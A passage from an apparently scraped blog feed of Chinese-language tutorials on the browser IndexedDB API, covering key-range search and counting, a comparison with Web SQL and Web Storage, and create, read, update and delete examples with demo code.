和事务型面向对象数据库系统。对数据库的所有操作，都要通过事务完成。 后端开发者都知道，SQL 语句中有 BETWEEN 操作符和 COUNT() 函数可以用来对匹配的记录进行过滤和计数。IndexedDB 也提供了 IDBKeyRange 接口和 IDBObjectStore.count() 方法可以实现相同的目的。 SELECT COUNT(*) FROM Persons WHERE LastName BETWEEN 'Adams' AND 'Carter'; 范围搜索 键集合 IDBKeyRange 对象通过使用一个键或某个范围的键从 IDBObjectStore 和 IDBIndex 对象中检索记录，并可以使用下限和上限来限制范围。下表给出了检索特定范围内的方法： 特定范围 方法 All keys ≥ x IDBKeyRange.lowerBound (x) All keys &gt; x IDBKeyRange.lowerBound (x, true) All keys ≤ y IDBKeyRange.upperBound (y) All keys &lt; y IDBKeyRange.upperBound (y, true) All keys ≥ x &amp;&amp; ≤ y IDBKeyRange.bound (x, y) All keys &gt; x &amp;&amp;&lt; y IDBKeyRange.bound (x, y, true, true) All keys &gt; x &amp;&amp; ≤ y IDBKeyRange.bound (x, y, true, false) All keys ≥ x &amp;&amp;&lt; y IDBKeyRange.bound (x, y, false, true) The key = z IDBKeyRange.only (z) bound()、only()、lowerBound()、upperBound() 方法即是方法名字面意思：“范围内”、“仅仅是”、“小于某值、“大于某值”。方法最后还支持两个布尔值参数，布尔值参数为 true 的时候表示不含范围边界。 结果计数 IDBObjectStore 接口的 count(query) 方法返回一个 IDBRequest 对象，并在单独的线程中返回与提供的键或匹配的记录总数。其中 query 参数可以是键属性或 IDBKeyRange 对象。如果未提供参数，则返回存储中的记录总数。 使用 下面我们在 IndexedDB 存储中插入一系列数据，然后通过 IDBKeyRange 对象对结果进行范围搜索，并使用 IDBObjectStore 接口的 count(query) 方法对结果进行计数。 &lt;!DOCTYPE html&gt; &lt;body&gt; &lt;ul&gt;&lt;/ul&gt; &lt;form&gt; &lt;div&gt; &lt;div&gt; &lt;label for=&quot;none&quot;&gt;不筛选&lt;/label&gt; &lt;input type=&quot;radio&quot; name=&quot;value&quot; value=&quot;none&quot; id=&quot;none&quot; checked /&gt; &lt;/div&gt; &lt;/div&gt; &lt;div&gt; &lt;div&gt; &lt;label for=&quot;only&quot;&gt;单个值筛选&lt;/label&gt; &lt;input type=&quot;radio&quot; name=&quot;value&quot; value=&quot;only&quot; id=&quot;only&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;onlytext&quot;&gt;值&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;onlytext&quot; id=&quot;onlytext&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;div&gt; &lt;div&gt; &lt;label for=&quot;range&quot;&gt;筛选范围内的值&lt;/label&gt; &lt;input type=&quot;radio&quot; name=&quot;value&quot; value=&quot;range&quot; id=&quot;range&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;rangelowertext&quot;&gt;范围下限&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;rangelowertext&quot; id=&quot;rangelowertext&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;rangeuppertext&quot;&gt;范围上限&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;rangeuppertext&quot; id=&quot;rangeuppertext&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;div&gt; &lt;div&gt; &lt;label for=&quot;lower&quot;&gt;筛选不低于下限的值&lt;/label&gt; &lt;input type=&quot;radio&quot; name=&quot;value&quot; value=&quot;lower&quot; id=&quot;lower&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;lowerboundtext&quot;&gt;下限&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;lowerboundtext&quot; id=&quot;lowerboundtext&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;div&gt; &lt;div&gt; &lt;label for=&quot;upper&quot;&gt;筛选不高于上限的值&lt;/label&gt; &lt;input type=&quot;radio&quot; name=&quot;value&quot; value=&quot;upper&quot; id=&quot;upper&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;upperboundtext&quot;&gt;上限&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;upperboundtext&quot; id=&quot;upperboundtext&quot; /&gt; &lt;/div&gt; &lt;/div&gt; &lt;div&gt; &lt;div&gt; &lt;input type=&quot;radio&quot; name=&quot;filterIndex&quot; value=&quot;fThing&quot; id=&quot;thing&quot; checked /&gt; &lt;label for=&quot;thing&quot;&gt;按名称筛选和排序&lt;/label&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=&quot;radio&quot; name=&quot;filterIndex&quot; value=&quot;fRating&quot; id=&quot;rating&quot; /&gt; &lt;label for=&quot;rating&quot;&gt;按评分筛选和排序&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;input class=&quot;run&quot; type=&quot;submit&quot; value=&quot;查询&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;script&gt; var db; var things = [ { fThing: &quot;Drum kit&quot;, fRating: 10 }, { fThing: &quot;Family&quot;, fRating: 10 }, { fThing: &quot;Batman&quot;, fRating: 9 }, { fThing: &quot;Brass eye&quot;, fRating: 9 }, { fThing: &quot;The web&quot;, fRating: 9 }, { fThing: &quot;Mozilla&quot;, fRating: 9 }, { fThing: &quot;Firefox OS&quot;, fRating: 9 }, { fThing: &quot;Curry&quot;, fRating: 9 }, { fThing: &quot;Paneer cheese&quot;, fRating: 8 }, { fThing: &quot;Mexican food&quot;, fRating: 8 }, { fThing: &quot;Chocolate&quot;, fRating: 7 }, { fThing: &quot;Heavy metal&quot;, fRating: 10 }, { fThing: &quot;Monty Python&quot;, fRating: 8 }, { fThing: &quot;Aphex Twin&quot;, fRating: 8 }, { fThing: &quot;Gaming&quot;, fRating: 7 }, { fThing: &quot;Frank Zappa&quot;, fRating: 9 }, { fThing: &quot;Open minds&quot;, fRating: 10 }, { fThing: &quot;Hugs&quot;, fRating: 9 }, { fThing: &quot;Ale&quot;, fRating: 9 }, { fThing: &quot;Christmas&quot;, fRating: 8 }, ]; var list = document.querySelector(&quot;ul&quot;); var form = document.querySelector(&quot;form&quot;); var thing = document.querySelector(&quot;#thing&quot;); var rating = document.querySelector(&quot;#rating&quot;); var button = document.querySelector(&quot;button&quot;); var onlyText = document.querySelector(&quot;#onlytext&quot;); var rangeLowerText = document.querySelector(&quot;#rangelowertext&quot;); var rangeUpperText = document.querySelector(&quot;#rangeuppertext&quot;); var lowerBoundText = document.querySelector(&quot;#lowerboundtext&quot;); var upperBoundText = document.querySelector(&quot;#upperboundtext&quot;); window.onload = function() { rating.onchange = e =&gt; { document.querySelectorAll('input[type=text]').forEach(v =&gt; { v.setAttribute('pattern', '[0-9]'); v.title = '请输入数字！'; }); }; thing.onchange = e =&gt; { document.querySelectorAll('input[type=text]').forEach(v =&gt; { v.setAttribute('pattern', '[A-Z]{1}'); v.title = '请输入单个大写字母！'; }); }; form.onsubmit = e =&gt; { e.preventDefault(); displayData(); }; window.indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB; window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction; window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange; var DBOpenRequest = window.indexedDB.open(&quot;fThings&quot;, 1); DBOpenRequest.onsuccess = function(event) { db = DBOpenRequest.result; populateData(); }; DBOpenRequest.onupgradeneeded = function(event) { var db = event.target.result; db.onerror = function(event) { note.innerHTML += &quot;&lt;li&gt;Error loading database.&lt;/li&gt;&quot;; }; var objectStore = db.createObjectStore(&quot;fThings&quot;, { keyPath: &quot;fThing&quot; }); objectStore.createIndex(&quot;fRating&quot;, &quot;fRating&quot;, { unique: false }); }; function populateData() { var transaction = db.transaction([&quot;fThings&quot;], &quot;readwrite&quot;); var objectStore = transaction.objectStore(&quot;fThings&quot;); for (i = 0; i &lt; things.length; i++) { var request = objectStore.put(things[i]); } transaction.oncomplete = function() { displayData(); }; } var keyRangeValue = null; function displayData() { checkedValue = document.querySelector('input[name=&quot;value&quot;]:checked').value; var transaction = db.transaction([&quot;fThings&quot;], &quot;readonly&quot;); var objectStore = transaction.objectStore(&quot;fThings&quot;); var filterIndex = document.querySelector('input[name=&quot;filterIndex&quot;]:checked').value; if (filterIndex == &quot;fThing&quot;) { if (checkedValue == &quot;none&quot;) { keyRangeValue = null; } else if (checkedValue == &quot;only&quot;) { keyRangeValue = IDBKeyRange.only(onlyText.value); } else if (checkedValue == &quot;range&quot;) { keyRangeValue = IDBKeyRange.bound(rangeLowerText.value, rangeUpperText.value, false, false); } else if (checkedValue == &quot;lower&quot;) { keyRangeValue = IDBKeyRange.lowerBound(lowerBoundText.value); } else if (checkedValue == &quot;upper&quot;) { keyRangeValue = IDBKeyRange.upperBound(upperBoundText.value); } } else { //遍历 fRating 索引而不是对象存储： objectStore = objectStore.index(&quot;fRating&quot;); if (checkedValue == &quot;none&quot;) { keyRangeValue = null; } else if (checkedValue == &quot;only&quot;) { keyRangeValue = IDBKeyRange.only(parseFloat(onlyText.value)); } else if (checkedValue == &quot;range&quot;) { keyRangeValue = IDBKeyRange.bound(parseFloat(rangeLowerText.value), parseFloat(rangeUpperText.value), false, false); } else if (checkedValue == &quot;lower&quot;) { keyRangeValue = IDBKeyRange.lowerBound(parseFloat(lowerBoundText.value)); } else if (checkedValue == &quot;upper&quot;) { console.log(upperBoundText.value); keyRangeValue = IDBKeyRange.upperBound(parseFloat(upperBoundText.value)); } } if (keyRangeValue != null) { const { lower, upper, lowerOpen, upperOpen } = keyRangeValue; console.log(`范围的下限: ${lower},下限值是否包含在键范围内: ${lowerOpen}\\n 范围的上限: ${upper}, 上限值是否包含在键范围内: ${upperOpen}`); } list.innerHTML = &quot;&quot;; objectStore.openCursor(keyRangeValue).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { var listItem = document.createElement(&quot;li&quot;); listItem.innerHTML = &quot;&lt;strong&gt;&quot; + cursor.value.fThing + &quot;&lt;/strong&gt;, &quot; + cursor.value.fRating; list.appendChild(listItem); cursor.continue(); } }; var countRequest = objectStore.count(keyRangeValue); countRequest.onsuccess = function() { var listItem = document.createElement(&quot;li&quot;); listItem.innerHTML = &quot;&lt;strong&gt;总计&lt;/strong&gt;: &quot; + countRequest.result; list.insertAdjacentElement('afterbegin', listItem); }; }; }; &lt;/script&gt; &lt;style&gt; ul { list-style-type: none; flex: 100px; margin-right: 1em; padding: 2rem 1rem; text-align: center; background: white linear-gradient(to bottom, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.2)); box-shadow: 3px 3px 10px black; } li { padding-bottom: 1rem; } body { display: flex; } form { flex: 5; margin-top: 1rem; } form&gt;div { margin-bottom: 1rem; padding: 1rem 1rem 2rem; background: white linear-gradient(to bottom, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.2)); box-shadow: 3px 3px 10px black; } form div div { clear: both; margin-top: 1rem; } form div label { width: 55%; clear: both; } form div input { float: right; } form div input[type=&quot;text&quot;] { width: 30%; } form div input[type=&quot;radio&quot;] { margin-right: 10px; } button { display: block; width: 30%; margin: 0 auto; line-height: 1.5; box-shadow: 1px 1px 2px black; } :invalid { outline-color: red; } &lt;/style&gt; 马上掘金 其他 前端本地存储数据库 IndexedDB 的增删改查 前端本地存储数据库 IndexedDB 和 Web SQL、Web Storage 的对比 ","link":"https://zkrisj.github.io/post/qian-duan-ben-di-cun-chu-shu-ju-ku-indexeddb-de-fan-wei-sou-suo-he-ji-shu/"},{"title":"前端本地存储数据库 IndexedDB 和 Web SQL、Web Storage 的对比","content":"介绍 将大量数据储存在客户端，这样可以减少从服务器获取数据的压力，提升用户体验。现有的浏览器数据储存方案，都不适合储存大量数据：Cookie 的大小不超过4KB，且每次请求都会发送回服务器；Storage 存储在 5MB 左右，各浏览器不同，而且不提供搜索功能，也不能建立自定义的索引。所以，需要一种新的解决方案在客户端存储数据。 IndexedDB 是一种将数据持久存储在用户浏览器中的方法，它可以创建具有丰富查询能力的 Web 应用程序，并且可以在线和离线工作，它的存储空间比 Storage 大得多，一般来说不少于 250MB，甚至没有上限。IndexedDB 适用于存储大量数据的应用程序（例如，图书馆中的目录）和不需要持续互联网连接即可工作的应用程序（例如，邮件客户端、待办事项列表和记事本）。 同源策略 与大多数 Web 存储解决方案一样，IndexedDB 遵循同源策略。 可以访问相同域内存储的数据，但无法跨不同域访问数据。 第三方窗口内容（例如 &lt;iframe&gt; 内容）可以访问其嵌入来源的 IndexedDB 存储，除非浏览器设置为从不接受第三方 cookie。 面向对象的数据库 IndexedDB 是一个基于 JavaScript 的面向对象数据库，IndexedDB 内部采用对象仓库（object store）存放数据。 允许存储和检索使用“键”索引的对象。 所有类型的数据都可以直接存入，包括结构化克隆算法支持的任何 JavaScript 对象都可以持久保存到该存储。 支持储存二进制数据（ArrayBuffer 对象和 Blob 对象）。 对象仓库中，数据以&quot;键值对&quot;的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出错误。 NoSQL 数据库 IndexedDB 不是一个关系型数据库，在传统的关系数据库中，使用表来存储数据行和命名数据类型列的集合。 IndexedDB 不使用结构化查询语言 (SQL)，更接近 NoSQL 数据库。 它在生成游标的索引上使用查询，您可以使用游标遍历结果集。 IndexedDB 要求您为一种数据类型创建对象存储并将 JavaScript 对象持久保存到该存储。每个对象存储都可以有一个索引集合，可以高效地查询和迭代。 事务型 IndexedDB 属于事务型数据库系统，对数据库所做的所有更改都发生在事务中。这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。 在 IndexedDB 中所做的一切都在事务上下文中发生，IndexedDB API 提供了许多代表索引、表、游标等的对象，但每个对象都与特定事务相关联。因此，不能在事务外执行命令或打开游标。 事务对象提供 error、abort 和 complete 三个事件，用来监听操作结果。 事务具有明确定义的生命周期，因此在事务完成后尝试使用它会抛出异常。 此外，事务自动提交，不能手动提交。例如，当同时在两个不同的选项卡中打开 Web 应用程序的两个实例时，如果没有事务操作，这两个实例可能会干扰彼此的修改。 异步 IndexedDB API 大部分都是异步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。 API 不会通过返回值提供数据；相反，它必须传递一个回调函数来获取返回值。 例如，很多请求具有 onsuccess 和 onerror 属性，也可以对它们调用 addEventListener() 和 removeEventListener()。 它们还有 readyState、result 和 errorCode 属性可以告诉您请求的状态。result 属性特别神奇，因为它可以是许多不同的东西，具体取决于请求的生成方式（例如，一个 IDBCursor 实例，或者您刚刚插入数据库的值的键）。 数据同步 IndexedDB API 并非设计用于处理与服务器端数据库的同步。 如果需要与服务器端数据库的同步，可以编写将客户端 indexedDB 数据库与服务器端数据库同步的代码。 清除数据库 注意，浏览器可以清除数据库，例如在以下情况下： 浏览器的设置允许用户删除给定网站存储的所有数据，包括 cookie、书签、存储的密码和 IndexedDB 数据。 某些浏览器具有“隐私浏览”(Firefox) 或“隐身”(Chrome) 模式。在会话结束时，浏览器会清除数据库。 已达到磁盘或配额限制。 数据已损坏。 对该功能进行了不兼容的更改。 主要接口 数据库：IDBDatabase 对象 数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。 IDBDatabase 接口提供一个到数据库的连接。 使用 IDBDatabase 对象在数据库中打开一个 transaction, 然后进行操作或者删除数据库中的对象。 IDBDatabase 接口是唯一一个能够访问和管理数据库版本的接口。 IndexedDB 数据库在同一个时刻，只能有一个版本的数据库存在。 如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。 对象仓库：IDBObjectStore 对象 每个数据库包含若干个对象仓库（object store）。它类似于关系型数据库的表格。 对象库中的记录根据其键值进行排序。这种排序可以实现快速插入，查找和有序检索。 对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。数据体可以是任意数据类型，不限于对象。 索引： IDBIndex 对象 为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。 IDBIndex 接口提供了异步获取数据库中一个 index（被引用的 object store）的功能。 可以通过使用该接口来取回数据。IDBCursor 也提供了另一种方式。 一个 index 可以让你在 object store 的记录中，通过使用记录的 properties（属性）来寻找记录。 在 object store 中新增、更新或是删除记录时，索引中的记录将自动填充。 索引中的每条记录只能指向其引用的 object store 中的唯一一条记录，但是多个索引可以引用同一个 object store。 当 object store 变更时，所有引用 object store 的索引都会自动更新。 事务： IDBTransaction 对象 异步事务使用数据库中的事件对象属性。 由 IDBDatabase 发起事务，通过 IDBTransaction 来设置事务的模式（例如：是否只读 readonly 或读写 readwrite）。 事务在被创建的时候就已经开始，并非在发起第一个请求（IDBRequest) 的时候。例如下面的例子，代码执行后，object store 应该具有值 &quot;2&quot;, 因为 trans2 应该在 trans1 之后执行。 const trans1 = db.transaction(&quot;foo&quot;, &quot;readwrite&quot;); const trans2 = db.transaction(&quot;foo&quot;, &quot;readwrite&quot;); const objectStore2 = trans2.objectStore(&quot;foo&quot;) const objectStore1 = trans1.objectStore(&quot;foo&quot;) objectStore2.put(&quot;2&quot;, &quot;key&quot;); objectStore1.put(&quot;1&quot;, &quot;key&quot;); 事务失败的情况： 由于请求出错而中止，例如尝试 IDBObjectStore.add() 添加相同的键的记录两次，或 IDBObjectStore.put() 更新具有唯一性约束的相同索引键。这会导致请求错误，并会冒泡到事务错误，从而中止事务。这可以通过在 IDBRequest.error 事件上使用 preventDefault() 来防止。 显式调用 IDBTransaction.abort() 方法（回滚与此事务关联的数据库中对象的所有更改）。 IDBRequest 的 success 和 error 事件处理程序中的未捕获异常。 I/O 错误（例如实际写入磁盘失败，或其他操作系统/硬件故障）。 超出配额（存储）。 用户代理（浏览器）崩溃。 操作请求：IDBRequest 对象 indexedDB 所有异步操作立即返回一个 IDBRequest 实例。 这个对象通过三个事件 error（打开数据库失败）、success（打开数据库成功）、upgradeneeded（打开数据库的版本号，大于数据库的实际版本号）来处理打开数据库的操作结果。 每一个请求都有一个 readyState 属性，初始时为 pending，当请求完成或失败的时候，readyState 会变为 done。当状态值变为 done 时，每一个请求都会返回 result 和 error 属性，并且会触发一个事件（success 或 error）。 当状态保持为 pending 时，任何尝试访问 result 或 error 属性的行为会触发一个 InvalidStateError 异常。 const request = window.indexedDB.open(databaseName, version); request.onsuccess = function (event) { db = request.result; console.log('数据库打开成功'); }; request.onupgradeneeded = function (event) { db = event.target.result; } 游标： IDBCursor 对象 遍历数据表格的多条记录，要使用指针对象 IDBCursor，它使应用程序能够异步处理在游标范围内的所有记录。 游标有一个 source 只读属性，指示游标正在迭代的索引（IDBIndex）或者对象存储区（IDBObjectStore）。 游标在所属区间范围内有一个位置，根据记录健（存储字段）的顺序递增或递减方向移动。 可以在同一时间拥有多个游标。 function readAll() { const objectStore = db.transaction('person').objectStore('person'); // openCursor()方法是一个异步操作，所以要监听success事件 objectStore.openCursor().onsuccess = function (event) { const cursor = event.target.result; if (cursor) { console.log('Id: ' + cursor.key); console.log('Name: ' + cursor.value.name); console.log('Age: ' + cursor.value.age); console.log('Email: ' + cursor.value.email); cursor.continue(); } else { console.log('没有更多数据了！'); } }; } 键集合：IDBKeyRange 对象 通过使用一个键或某个范围的键从 IDBObjectStore 和 IDBIndex 对象中检索记录。 可以使用下限和上限来限制范围。例如，可以遍历具有 A–Z 范围中的键的所有值。 下表给出了检索特定范围内的键的方法： 特定范围 方法 All keys ≥ x IDBKeyRange.lowerBound (x) All keys &gt; x IDBKeyRange.lowerBound (x, true) All keys ≤ y IDBKeyRange.upperBound (y) All keys &lt; y IDBKeyRange.upperBound (y, true) All keys ≥ x &amp;&amp; ≤ y IDBKeyRange.bound (x, y) All keys &gt; x &amp;&amp;&lt; y IDBKeyRange.bound (x, y, true, true) All keys &gt; x &amp;&amp; ≤ y IDBKeyRange.bound (x, y, true, false) All keys ≥ x &amp;&amp;&lt; y IDBKeyRange.bound (x, y, false, true) The key = z IDBKeyRange.only (z) IndexedDB 库 localForage、dexie.js、PouchDB、idb、idb-keyval、JsStore、lovefield 等库使 IndexedDB 的使用对开发者来说更加友好。 和 Web Storage 存储对比 Web Storage 包含如下两种机制： sessionStorage 为每一个给定的源（origin）维持一个独立的存储区域，该存储区域在页面会话期间可用（即只要浏览器处于打开状态，包括页面重新加载和恢复）。 localStorage 同样的功能，但是在浏览器关闭，然后重新打开后数据仍然存在。 localStorage.colorSetting = '#a4509b'; localStorage['colorSetting'] = '#a4509b'; localStorage.setItem('colorSetting', '#a4509b'); 这三种方式都相同地设置了 colorSetting 条目。 对比如下： indexedDB 存储 IE10+ 支持，Storage 存储 IE8+ 支持，后者兼容性更好。 Storage 存储，结果每次写入都要字符串化，写出要解析成对象。使用 indexedDB 则无需数据转换。 indexedDB 可以在 Web Worker 中使用，Storage 存储在 Web Worker 中不可用。所以在进行 PWA 开发的时候，数据存储只能使用 indexedDB。 如何选择： 如果存储数据结构简单，例如基本类型，使用 Storage 存储更加方便。 如果数据结构比较复杂，同时对浏览器兼容性没要求，可以使用 indexedDB。 如果是在 Service Worker 中开发应用，只能使用 indexedDB 数据存储。 和 Web SQL 对比 除了 IE 和 Firefox 不支持 Web SQL，Safari 从 13 开始也舍弃了 Web SQL，目前只有基于 Chromium 系列的浏览器继续支持。使用方式如下： const db = openDatabase('mydb', '1.0', 'Test DB', 1024 * 10); const msg = ['www.w3school.com.cn', 2]; db.transaction(function(tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS LOGS (id unique, log)'); }); db.transaction(function(tx) { tx.executeSql('INSERT INTO LOGS (id, log) VALUES (1, &quot;mdn&quot;)'); tx.executeSql('INSERT INTO LOGS (id, log) VALUES (2, &quot;https://developer.mozilla.org/&quot;)'); }); db.transaction(function(tx) { tx.executeSql('SELECT * FROM LOGS', [], console.log); }); db.transaction(function(tx) { tx.executeSql('DELETE FROM LOGS WHERE id=1', [], console.log); }); db.transaction(function(tx) { tx.executeSql('UPDATE LOGS SET log=? WHERE id=?', msg, console.log); }); 上面这段代码即完成了建表、插入、查询、删除、更新数据的 Web SQL。可以看到直接把 SQL 语句嵌入到 JS 中了，与关系型数据库的操作非常类似。这个设计成为了 Web SQL 被舍弃的重要原因： 学习成本高了很多，SQL 虽然本身并不复杂，但与前端跨度较大。 本身使用很不方便，需要把 JS 对象转换成关系型的字符串语句。 详细对比表格： Web SQL IndexedDB 优点 真正意义上的关系型数据库，类似于 SQLite（遵守 ACID 的轻型关系型数据库管理系统）。 允许对象的快速索引和搜索，因此在 Web 应用程序场景中，您可以非常快速地管理数据以及读取/写入数据。由于是 NoSQL 数据库，因此我们可以根据实际需求设定我们的 JavaScript 对象和索引。在异步模式下工作，每个事务具有适度的粒状锁。这允许您在 JavaScript 的事件驱动模块内工作。 不足 W3C 已弃用它，这意味着不再维护或开发它。由于使用 SQL 语言，因此需要掌握 SQL 语法和转换 JavaScript 对象为对应的 SQL 语句。非对象驱动。 API 复杂。 位置 包含行和列的表。 包含 JavaScript 对象和键的存储对象。 查询机制 SQL Cursor APIs，Key Range APIs，应用程序代码 事务 锁可以发生在数据库，表，行的“读写”时候。 锁可以发生在数据库版本变更，或是存储对象“只读”和“读写”事务时候。 事务提交 事务创建是显式的。默认是回滚，除非我们调用提交。 事务创建是显式的。默认是提交，除非我们调用中止或有一个错误没有被捕获。 增删改查示例 参见 前端本地存储数据库 IndexedDB 的增删改查 参考资料 HTML5 indexedDB前端本地存储数据库实例教程 ","link":"https://zkrisj.github.io/post/qian-duan-ben-di-cun-chu-shu-ju-ku-indexeddb-he-web-sqlweb-storage-de-dui-bi/"},{"title":"前端本地存储数据库 IndexedDB 的增删改查","content":"介绍 IndexedDB 是一种浏览器底层 API，目前各浏览器都已支持，兼容性很好。虽然 Web Storage 在存储较少量的数据很有用，但对于存储更大量的结构化数据来说力不从心。而 IndexedDB 提供了这种场景的解决方案。 特点 IndexedDB 内部采用对象仓库（object store）存放键值对数据。可以存储结构化克隆算法支持的任何对象。每一个数据记录都有对应的主键，主键是独一无二的，并且不能有重复。 使用索引实现对数据的高性能搜索。 IndexedDB API 大部分都是异步的。不会通过返回值提供数据，而是要传递一个回调函数来获取返回值。 同大多数 Web 存储解决方案一样，IndexedDB 遵循同源策略。即可以访问相同域内存储的数据，但无法跨不同域访问数据。 可以存储文件/二进制对象。 在 Web Worker 中可用。 IndexedDB 属于 NoSQL 和事务型面向对象数据库系统。对数据库的所有操作，都要通过事务完成。下面我们通过一个项目管理的增删改查来演示 IndexedDB API 的使用。 连接数据库 为了获取数据库的访问权限，需要在 window 对象的 indexedDB 属性上调用 open() 方法。该方法返回一个 IDBRequest 对象，异步操作通过在 IDBRequest 对象上触发事件来和调用进行通信。 const DBOpenRequest = window.indexedDB.open('project', 2); 连接数据库会在一个单独的线程中进行，包括以下几个步骤： 指定数据库已经存在时： 等待 versionchange 操作完成。 如果数据库已计划删除，那等着删除完成。 如果已有数据库版本高于给定的 version，中止操作并返回类型为 VersionError 的 DOMError。 如果已有数据库版本低于给定的 version，触发一个 versionchange 操作。 如果数据库不存在，创建指定名称的数据库，将版本号设置为给定版本，如果未给定版本号，则设置为 1。 创建数据库连接。 要注意的是，如果指定了版本号，后续的操作主要在 upgradeneeded 事件的监听函数里面完成。版本号不能使用浮点数，否则它将会被转变成离它最近的整数，这可能导致 upgradeneeded 事件不会被触发。 const request = indexedDB.open(&quot;MyTestDatabase&quot;, 2.4); // 不要这么做，因为版本会被置为 2。 我们对数据库某一行数据进行增加删除操作，我们是没有必要对数据库的版本号进行修改的。但是对于字段修改就不一样了，比方说原来是5列数据，我们现在改成6列，由于相关设置是在 onupgradeneeded 回调中，因此，这时我们需要增加版本号来触发字段修改。 indexedDB.open() 方法会返回一个 IDBRequest 对象。这个对象通过三种事件 error、success、upgradeneeded，处理打开数据库的操作结果。 let db; request.onerror = function (event) { console.log('数据库打开报错'); }; request.onsuccess = function (event) { db = request.result; console.log('数据库打开成功'); }; request.onupgradeneeded = function (event) { db = event.target.result; }; 新建对象仓库（新建表） IndexedDB 中新建对象仓库（新建表）需要使用 IDBDatabase 接口的 IDBDatabase.createObjectStore(name, options) 方法。 const objectStore = db.createObjectStore('project', { keyPath: 'id' }); name 被创建的 object store 的名称。 options 可选参数，其中包括以下的属性： keyPath - 新对象存储要使用的主键属性，定义浏览器应从对象存储或索引中的何处提取主键。如果为空或未指定，则创建对象存储时没有主键并将使用外键。还可以传入一个数组作为 keyPath。 autoIncrement - 是否使用自动递增的整数作为主键（第一个数据记录为1，第二个数据记录为2，以此类推），默认为 false。一般来说，keyPath 和 autoIncrement 属性只要使用一个就够了。 新建索引 IDBObjectStore.createIndex(indexName, keyPath, objectParameters) 法用来创建索引，可以理解为创建表字段，参数： indexName 创建的索引名称，可以使用空名称作为索引。 keyPath 索引使用的键属性，可以使用空创建索引, 也可以传递数组。 objectParameters 可选参数。常用参数之一是unique，表示该字段值是否唯一，不能重复。 新增数据 向对象仓库写入数据记录需要通过事务完成。 首先，新建一个事务。 const transaction = db.transaction('project', &quot;readwrite&quot;); 打开存储对象。 const objectStore = transaction.objectStore('project'); 添加到数据对象中 const objectStoreRequest = objectStore.add(newItem); 使用一行语句表示就是： db.transaction('project', &quot;readwrite&quot;).objectStore('project').add(newItem); 这里的 newItem 就是一个原生的纯粹的 JavaScript 对象，在本 demo 中，newItem 数据类似下面这样： { &quot;name&quot;: &quot;第一个项目&quot;, &quot;begin&quot;: &quot;2022-12-12&quot;, &quot;end&quot;: &quot;2057-07-16&quot;, &quot;person&quot;: &quot;张三&quot;, &quot;remark&quot;: &quot;测试测试&quot; } 更新数据 先根据 id 使用 objectStore.get(id) 方法获得对应行的存储对象。 再使用 objectStore.put(record) 进行数据库数据替换。 // 新建事务 const transaction = db.transaction('project', &quot;readwrite&quot;); // 打开已经存储的数据对象 const objectStore = transaction.objectStore(project); // 获取存储的对应键的存储对象 const objectStoreRequest = objectStore.get(id); // 获取成功后替换当前数据 objectStoreRequest.onsuccess = function(event) { // 当前数据 const myRecord = objectStoreRequest.result; // 遍历替换 for (const key in updateData) { if (typeof myRecord[key] != 'undefined') { myRecord[key] = data[key]; } } // 更新数据库存储数据 objectStore.put(myRecord); }; 删除数据 使用 IDBObjectStore.delete(key) 方法，和添加操作正好相反，但代码结构却是类似的。 const objectStoreRequest = db.transaction('project', &quot;readwrite&quot;).objectStore('project').delete(id); 获取数据 IDBCursor 可以让我们一行一行读取数据库数据。 const objectStore = db.transaction(dbName).objectStore(dbName); objectStore.openCursor().onsuccess = function(event) { const cursor = event.target.result; if (cursor) { // cursor.value就是数据对象 // 游标没有遍历完，继续 cursor.continue(); } else { // 如果全部遍历完毕... } } 可以看到，我们使用存储对象的 openCursor() 打开游标，在 onsuccess 回调中就可以遍历我们的游标对象了。其中 cursor.value 就是完整的数据对象，纯JS对象，就像下面这样： { &quot;id&quot;: 1, &quot;name&quot;: &quot;第一个项目&quot;, &quot;begin&quot;: &quot;2022-12-12&quot;, &quot;end&quot;: &quot;2057-07-16&quot;, &quot;person&quot;: &quot;张三&quot;, &quot;remark&quot;: &quot;&quot; } IDBKeyRange 需要和 IDBCursor 一起使用。例如，只获取 id 从 4~10 之间的数据： // 确定打开的游标的主键范围 const keyRangeValue = IDBKeyRange.bound(4, 10); // 打开对应范围的游标 const objectStore = db.transaction(dbName).objectStore(dbName); objectStore.openCursor(keyRangeValue).onsuccess = function(event) { const cursor = event.target.result; // ... } 其中，有 bound()、only()、lowerBound()、upperBound() 这几个方法，意思就是方法名字面意思：“范围内”、“仅仅是”、“小于某值、“大于某值”。方法最后还支持两个布尔值参数，例如： const keyRangeValue = IDBKeyRange.bound(4, 10, true, true); 则表示范围 